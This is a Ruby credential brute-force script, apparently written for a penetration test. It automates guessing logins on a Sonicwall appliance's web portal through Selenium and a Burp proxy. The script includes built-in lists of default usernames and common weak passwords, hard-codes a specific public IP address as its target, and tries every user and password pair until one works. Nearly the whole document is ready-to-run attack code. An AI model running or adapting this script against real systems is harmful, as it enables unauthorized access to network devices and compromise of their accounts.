#!/usr/bin/env ruby

#JoSko - 12.13.2016

=begin
Sonicwall login performs client-side javascript with random values for each login attempt.

Basic options for automating the test (burp intruder) were not going to work, as the 
client-side JS transforms the password, and sends a digest instead. 

Parsing the random values, and performing the crypto locally would be ideal, but I don't have 
time/access to the target to know if my solution would be working as expected. 

Requirements:
Firefox 47.0.1 required from testing. 
> https://ftp.mozilla.org/pub/firefox/releases/

Selenium 3.0.3 used in testing. 
> gem install selenium-webdriver

Geckodriver 0.11.1
> https://github.com/mozilla/geckodriver/releases
> unpack and put it somewhere in your PATH

Burp Suite - Required as modern firefox doesn't allow any methods of allowing obsolete ssl. 

=end

require 'selenium-webdriver'

#Uncomment if you want to supply a line-separated list of users or passwords
#userlist = File.open("userlist.txt")
#passlist = File.open("passlist.txt")

#Builtin userlist / passlist. Comment them out if you want to use your own file
userlist = ["admin", "administrator", "backup", "daemon", "demo", "ftp", "guest", "nobody", "operator", "oracle", "root", "sa", "service", "sys", "sysadmin", "test", "test1", "tomcat", "unix", "user", "webmaster", "www"]
passlist = ["password", "password1", "Password1", "Password2", "Password3", "Password4", "Password5", "Password6", "Password7", "Password8", "Password9", "Password01", "Password123", "welcome", "password", "Welcome!", "welcome1", "Welcome2", "Welcome01", "123456", "P@ssw0rd", "Passw0rd", "test", "admin", "root", "Administrator1", "Administrator2", "administrator", "default", "changeme", "sa", "Winter08", "Winter09", "Winter10", "Winter11", "Winter12", "Winter13", "Winter14", "Winter15", "Winter16", "Winter2008", "Winter2009", "Winter2010", "Winter2011", "Winter2012", "Winter2013", "Winter2014", "Winter2015", "Winter2016", "Spring08", "Spring09", "Spring10", "Spring11", "Spring12", "Spring13", "Spring14", "Spring15", "Spring16", "Spring2008", "Spring2009", "Spring2010", "Spring2011", "Spring2012", "Spring2013", "Spring2014", "Spring2015", "Spring2016", "Summer08", "Summer09", "Summer10", "Summer11", "Summer12", "Summer13", "Summer14", "Summer15", "Summer16", "Summer2008", "Summer2009", "Summer2010", "Summer2011", "Summer2012", "Summer2013", "Summer2014", "Summer2015", "Summer2016", "Fall08", "Fall09", "Fall10", "Fall11", "Fall12", "Fall13", "Fall14", "Fall15", "Fall16", "Fall2008", "Fall2009", "Fall2010", "Fall2011", "Fall2012", "Fall2013", "Fall2014", "Fall2015", "Fall2016", "January15", "February15", "March15", "April15", "May15", "June15", "July15", "August15", "September15", "October15", "November15", "December15", "January16", "February16", "March16", "April16", "May16", "June16", "July16", "August16", "September16", "October16", "November16", "December16"]

#New profile with proxy for burp defaults
profile = Selenium::WebDriver::Firefox::Profile.new
proxy = Selenium::WebDriver::Proxy.new(:http => "localhost:8080", :ssl => "localhost:8080")
profile.proxy = proxy

#Enter your firefox bin path
Selenium::WebDriver::Firefox.path = "/Applications/Firefox 47.0.1.app/Contents/MacOS/firefox"

#If you don't want to use burp, swap these
#driver = Selenium::WebDriver.for :firefox, :desired_capabilities => {:marionette => false}
driver = Selenium::WebDriver.for :firefox, :profile => profile, :desired_capabilities => {:marionette => false}

#Your target
driver.navigate.to "https://24.176.185.59:8443/"

#For each password on each user
userlist.each do |user|
	passlist.each do |pass|
		#Switch to the authFrm frame
		driver.switch_to.frame "authFrm"
		
		#Enter the username into the userName form field
		username = driver.find_element(:id, 'userName')
		username.send_keys user

		#Enter the password into the pwd form field
		password = driver.find_element(:name, 'pwd')
		password.send_keys pass

		#Submit
		submitbutton = driver.find_element(:name, 'Submit')
		submitbutton.submit

		#Assumed that auth1.html is not in source of success page - never found login to verify
		unless driver.page_source =~ /auth1.html/
			puts "Login successful with: #{user}:#{pass}"
			exit
		end
	end
end

puts "Didn't find any working creds. Exiting..."
driver.quit
